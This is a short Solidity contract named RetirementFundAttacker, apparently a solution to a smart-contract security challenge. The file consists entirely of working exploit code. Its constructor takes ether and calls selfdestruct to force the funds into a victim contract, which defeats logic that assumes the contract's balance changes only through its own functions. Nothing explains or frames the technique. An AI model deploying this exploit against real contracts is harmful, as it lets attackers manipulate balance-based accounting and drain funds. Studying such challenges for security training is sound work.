pragma solidity ^0.8.9;
contract RetirementFundAttacker {

    constructor (address payable victimAddress) payable {
        require(msg.value > 0);
        selfdestruct(victimAddress);
    }
}